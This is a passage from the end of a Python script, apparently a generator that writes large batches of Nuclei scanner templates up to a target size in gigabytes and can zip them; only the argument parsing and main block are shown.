    print(f"Zip size: {zip_size_mb:.2f} MB ({zip_size_gb:.2f} GB)")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Generate massive nuclei templates')
    parser.add_argument('--output-dir', type=str, default='./nuclei-templates', help='Output directory for templates')
    parser.add_argument('--target-size', type=float, default=5.0, help='Target size in GB')
    parser.add_argument('--create-zip', action='store_true', help='Create a zip archive of all templates')
    parser.add_argument('--zip-output', type=str, default='./nuclei-templates.zip', help='Output path for zip archive')
    
    args = parser.parse_args()
    
    # Create output directory if it doesn't exist
    os.makedirs(args.output_dir, exist_ok=True)
    
    # Generate templates
    generate_all_templates(args.output_dir, args.target_size)
    
    # Create zip archive if requested
    if args.create_zip:
        create_zip_archive(args.output_dir, args.zip_output)
